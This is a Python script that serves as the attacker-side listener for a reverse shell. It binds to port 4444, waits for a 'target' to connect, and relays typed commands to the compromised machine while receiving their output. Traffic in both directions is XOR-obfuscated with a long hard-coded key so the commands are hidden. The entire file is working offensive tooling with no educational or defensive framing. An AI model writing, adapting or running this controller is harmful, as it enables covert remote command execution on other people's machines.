
import socket
key = b'111111111101111111111101111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def encode_xor(data):
	data = data.encode()
	data = byte_xor(data,key)
	return data

def xor_decode(data):
	data = byte_xor(data,key)
	data = data.decode()
	return data
def connection(s):

	print("Listening for connection...")
	conn, addr = s.accept()
	print("Target conected: ", addr[0])
	data = conn.recv(1024000)
	data = xor_decode(data)
	# data = data.decode()
	op=data
	while True:
		cmd=input(op+' ')
		if cmd == "exit":
			print("Closing the connection...")
			conn.close()
			connection(s)
		cmd = ' ' if cmd == '' else cmd
		try:
			# conn.send(cmd.encode())
			conn.send(encode_xor(cmd))
			op=conn.recv(1024000)

			op = xor_decode(op)
			# op = op.decode()
		except:
			print("Target got disconnected...")
			connection(s)

s=socket.socket()
try:
	s.bind(("0.0.0.0",4444))
	s.listen(1)
	connection(s)
except KeyboardInterrupt:
	print("Quitting...")
	s.close()
except:
	print("Error while processing...")

